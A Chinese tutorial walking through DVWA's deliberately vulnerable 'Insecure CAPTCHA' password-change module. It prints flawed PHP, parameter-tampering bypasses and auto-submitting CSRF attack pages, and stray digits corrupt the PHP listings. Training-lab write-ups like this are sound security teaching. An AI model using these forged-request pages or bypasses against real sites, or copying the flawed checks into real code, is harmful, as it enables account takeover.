**Insecure CAPTCHA**

Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅。

[![1.png](http://image.3001.net/images/20161110/1478762521859.png!small)](http://image.3001.net/images/20161110/1478762521859.png)

**reCAPTCHA验证流程**

这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。

[![1.png](http://image.3001.net/images/20161110/14787625541269.png!small)](http://image.3001.net/images/20161110/14787625541269.png)

服务器通过调用recaptcha\_check\_answer函数检查用户输入的正确性。

```
recaptcha_check_answer($privkey,$remoteip, $challenge,$response)
```


参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha\_challenge\_field字段的值，来自前端页面 ，$response是recaptcha\_response\_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：

> $is\_valid是布尔型的，表示校验是否有效，
> 
> $error是返回的错误代码。

（ps:有人也许会问，那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码）

下面对四种级别的代码进行分析。

**Low**

服务器端核心代码：

```
<?php        
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {       
    // Hide the CAPTCHA form       
    $hide_form = true;        
    // Get input       
    $pass_new  = $_POST[ 'password_new' ];       
    $pass_conf = $_POST[ 'password_conf' ];        1
    // Check CAPTCHA from 3rd party       1
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],       1
        $_SERVER[ 'REMOTE_ADDR' ],       1
        $_POST[ 'recaptcha_challenge_field' ],       1
        $_POST[ 'recaptcha_response_field' ] );        1
    // Did the CAPTCHA fail?       1
    if( !$resp->is_valid ) {       1
        // What happens when the CAPTCHA was entered incorrectly       2
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";       2
        $hide_form = false;       2
        return;       2
    }       2
    else {       2
        // CAPTCHA was correct. Do both new passwords match?       2
        if( $pass_new == $pass_conf ) {       2
            // Show next stage for the user       2
            echo "       2
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>       3
                <form action=\"#\" method=\"POST\">       3
                    <input type=\"hidden\" name=\"step\" value=\"2\" />       3
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />       3
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />       3
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />       3
                </form>";       3
        }       3
        else {       3
            // Both new passwords do not match.       3
            $html     .= "<pre>Both passwords must match.</pre>";       4
            $hide_form = false;       4
        }       4
    }       4
}        4
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {       4
    // Hide the CAPTCHA form       4
    $hide_form = true;        4
    // Get input       5
    $pass_new  = $_POST[ 'password_new' ];       5
    $pass_conf = $_POST[ 'password_conf' ];        5
    // Check to see if both password match       5
    if( $pass_new == $pass_conf ) {       5
        // They do!       5
        $pass_new = mysql_real_escape_string( $pass_new );       5
        $pass_new = md5( $pass_new );        5
        // Update database       6
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";       6
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );        6
        // Feedback for the end user       6
        echo "<pre>Password Changed.</pre>";       6
    }       6
    else {       6
        // Issue with the passwords matching       6
        echo "<pre>Passwords did not match.</pre>";       6
        $hide_form = false;       7
    }        7
    mysql_close();       7
}        7
?>
```


可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。

**漏洞利用**

1.通过构造参数绕过验证过程的第一步

首先输入密码，点击Change按钮，抓包：

[![1.png](http://image.3001.net/images/20161110/14787628337241.png!small)](http://image.3001.net/images/20161110/14787628337241.png)

（ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha\_challenge\_field、recaptcha\_response\_field两个参数）

更改step参数绕过验证码：

[![1.png](http://image.3001.net/images/20161110/14787628821104.png!small)](http://image.3001.net/images/20161110/14787628821104.png)

修改密码成功：

[![1.png](http://image.3001.net/images/20161110/1478762911998.png!small)](http://image.3001.net/images/20161110/1478762911998.png)

2.由于没有任何的防CSRF机制，我们可以轻易地构造攻击页面，页面代码如下（详见[CSRF模块的教程](http://www.freebuf.com/articles/web/118352.html)）。

`<html>`

`<body onload="document.getElementById('transfer').submit()">`

  `<div>`

    `<form method="POST" id="transfer" action="[http://192.168.153.130/dvwa/vulnerabilities/captcha/](http://192.168.153.130/dvwa/vulnerabilities/captcha/)">`

`<input type="hidden" name="password_new" **value**="password">`

`<input type="hidden" name="password_conf" **value**="password">`

`<input type="hidden" name="step" **value**="2"`

`<input type="hidden" name="Change" **value**="Change">`

`</form>`

  `</div>`

`</body>`

`</html>`

当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。

[![1.png](http://image.3001.net/images/20161110/14787631004643.png!small)](http://image.3001.net/images/20161110/14787631004643.png)

美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击。

[![1.png](http://image.3001.net/images/20161110/14787631292942.png!small)](http://image.3001.net/images/20161110/14787631292942.png)

**Medium**

服务器端核心代码：

```
<?php        
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {       
    // Hide the CAPTCHA form       
    $hide_form = true;        
    // Get input       
    $pass_new  = $_POST[ 'password_new' ];       
    $pass_conf = $_POST[ 'password_conf' ];        1
    // Check CAPTCHA from 3rd party       1
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],       1
        $_SERVER[ 'REMOTE_ADDR' ],       1
        $_POST[ 'recaptcha_challenge_field' ],       1
        $_POST[ 'recaptcha_response_field' ] );        1
    // Did the CAPTCHA fail?       1
    if( !$resp->is_valid ) {       1
        // What happens when the CAPTCHA was entered incorrectly       2
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";       2
        $hide_form = false;       2
        return;       2
    }       2
    else {       2
        // CAPTCHA was correct. Do both new passwords match?       2
        if( $pass_new == $pass_conf ) {       2
            // Show next stage for the user       2
            echo "       2
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>       3
                <form action=\"#\" method=\"POST\">       3
                    <input type=\"hidden\" name=\"step\" value=\"2\" />       3
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />       3
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />       3
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />       3
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />       3
                </form>";       3
        }       3
        else {       3
            // Both new passwords do not match.       4
            $html     .= "<pre>Both passwords must match.</pre>";       4
            $hide_form = false;       4
        }       4
    }       4
}        4
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {       4
    // Hide the CAPTCHA form       4
    $hide_form = true;        5
    // Get input       5
    $pass_new  = $_POST[ 'password_new' ];       5
    $pass_conf = $_POST[ 'password_conf' ];        5
    // Check to see if they did stage 1       5
    if( !$_POST[ 'passed_captcha' ] ) {       5
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";       5
        $hide_form = false;       5
        return;       5
    }        6
    // Check to see if both password match       6
    if( $pass_new == $pass_conf ) {       6
        // They do!       6
        $pass_new = mysql_real_escape_string( $pass_new );       6
        $pass_new = md5( $pass_new );        6
        // Update database       6
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";       6
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );        7
        // Feedback for the end user       7
        echo "<pre>Password Changed.</pre>";       7
    }       7
    else {       7
        // Issue with the passwords matching       7
        echo "<pre>Passwords did not match.</pre>";       7
        $hide_form = false;       7
    }        8
    mysql_close();       8
}        8
?>
```


可以看到，Medium级别的代码在第二步验证时，参加了对参数passed\_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。

**漏洞利用**

1.可以通过抓包，更改step参数，增加passed\_captcha参数，绕过验证码。

抓到的包：

[![1.png](http://image.3001.net/images/20161110/1478763222683.png!small)](http://image.3001.net/images/20161110/1478763222683.png)

更改之后的包：

[![1.png](http://image.3001.net/images/20161110/14787632525623.png!small)](http://image.3001.net/images/20161110/14787632525623.png)

更改密码成功：

[![1.png](http://image.3001.net/images/20161110/14787632811739.png!small)](http://image.3001.net/images/20161110/14787632811739.png)

2.依然可以实施CSRF攻击，攻击页面代码如下。

`<**html**>`

`<**body** onload="document.getElementById('transfer').submit()">`

  `<**div**>`

    `<**form** method="POST" id="transfer" action="[http://192.168.153.130/dvwa/vulnerabilities/captcha/](http://192.168.153.130/dvwa/vulnerabilities/captcha/)">`

`<**input** type="hidden" name="password_new" value="password">`

`<**input** type="hidden" name="password_conf" value="password">`

`<**input** type="hidden" name="passed_captcha" value="true">`

`<**input** type="hidden" name="step" value="2">`

`<**input** type="hidden" name="Change" value="Change">`

`</**form**>`

  `</**div**>`

`</**body**>`

`</**html**>`

当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。

[![1.png](http://image.3001.net/images/20161110/14787633444694.png!small)](http://image.3001.net/images/20161110/14787633444694.png)

不过依然会跳转到更改密码成功的界面。

[![1.png](http://image.3001.net/images/20161110/14787633769617.png!small)](http://image.3001.net/images/20161110/14787633769617.png)

**High**

服务器端核心代码：

```
<?php        
if( isset( $_POST[ 'Change' ] ) ) {       
    // Hide the CAPTCHA form       
    $hide_form = true;        
    // Get input       
    $pass_new  = $_POST[ 'password_new' ];       
    $pass_conf = $_POST[ 'password_conf' ];        1
    // Check CAPTCHA from 3rd party       1
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],       1
        $_SERVER[ 'REMOTE_ADDR' ],       1
        $_POST[ 'recaptcha_challenge_field' ],       1
        $_POST[ 'recaptcha_response_field' ] );        1
    // Did the CAPTCHA fail?       1
    if( !$resp->is_valid && ( $_POST[ 'recaptcha_response_field' ] != 'hidd3n_valu3' || $_SERVER[ 'HTTP_USER_AGENT' ] != 'reCAPTCHA' ) ) {       1
        // What happens when the CAPTCHA was entered incorrectly       2
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";       2
        $hide_form = false;       2
        return;       2
    }       2
    else {       2
        // CAPTCHA was correct. Do both new passwords match?       2
        if( $pass_new == $pass_conf ) {       2
            $pass_new = mysql_real_escape_string( $pass_new );       2
            $pass_new = md5( $pass_new );        3
            // Update database       3
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";       3
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );        3
            // Feedback for user       3
            echo "<pre>Password Changed.</pre>";       3
        }       3
        else {       3
            // Ops. Password mismatch       3
            $html     .= "<pre>Both passwords must match.</pre>";       4
            $hide_form = false;       4
        }       4
    }        4
    mysql_close();       4
}       4
// Generate Anti-CSRF token       4
generateSessionToken();        4
?>
```


可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha\_response\_field不等于hidd3n\_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。

**漏洞利用**

搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数recaptcha\_response\_field、User-Agent上。

第一步依旧是抓包：

[![1.png](http://image.3001.net/images/20161110/14787634573020.png!small)](http://image.3001.net/images/20161110/14787634573020.png)

更改参数recaptcha\_response\_field以及http包头的User-Agent：

[![1.png](http://image.3001.net/images/20161110/14787634878111.png!small)](http://image.3001.net/images/20161110/14787634878111.png)

密码修改成功：

[![1.png](http://image.3001.net/images/20161110/14787635158708.png!small)](http://image.3001.net/images/20161110/14787635158708.png)

**Impossible**

服务器端核心代码

```
if( isset( $_POST[ 'Change' ] ) ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );        
    // Hide the CAPTCHA form       
    $hide_form = true;        
    // Get input       
    $pass_new  = $_POST[ 'password_new' ];       1
    $pass_new  = stripslashes( $pass_new );       1
    $pass_new  = mysql_real_escape_string( $pass_new );       1
    $pass_new  = md5( $pass_new );        1
    $pass_conf = $_POST[ 'password_conf' ];       1
    $pass_conf = stripslashes( $pass_conf );       1
    $pass_conf = mysql_real_escape_string( $pass_conf );       1
    $pass_conf = md5( $pass_conf );        1
    $pass_curr = $_POST[ 'password_current' ];       2
    $pass_curr = stripslashes( $pass_curr );       2
    $pass_curr = mysql_real_escape_string( $pass_curr );       2
    $pass_curr = md5( $pass_curr );        2
    // Check CAPTCHA from 3rd party       2
    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ],       2
        $_SERVER[ 'REMOTE_ADDR' ],       2
        $_POST[ 'recaptcha_challenge_field' ],       2
        $_POST[ 'recaptcha_response_field' ] );        3
    // Did the CAPTCHA fail?       3
    if( !$resp->is_valid ) {       3
        // What happens when the CAPTCHA was entered incorrectly       3
        echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";       3
        $hide_form = false;       3
        return;       3
    }       3
    else {       3
        // Check that the current password is correct       3
        $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );       4
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );       4
        $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );       4
        $data->execute();        4
        // Do both new password match and was the current password correct?       4
        if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {       4
            // Update the database       4
            $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );       4
            $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );       4
            $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );       5
            $data->execute();        5
            // Feedback for the end user - success!       5
            echo "<pre>Password Changed.</pre>";       5
        }       5
        else {       5
            // Feedback for the end user - failed!       5
            echo "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";       5
            $hide_form = false;       5
        }       6
    }       6
}        6
// Generate Anti-CSRF token       6
generateSessionToken();        6
?>
```


可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。

[![1.png](http://image.3001.net/images/20161110/14787635805191.png!small)](http://image.3001.net/images/20161110/14787635805191.png)

**\*本文原创作者：lonehand**

**转自：**[http://www.freebuf.com/articles/web/119692.html](http://www.freebuf.com/articles/web/119692.html)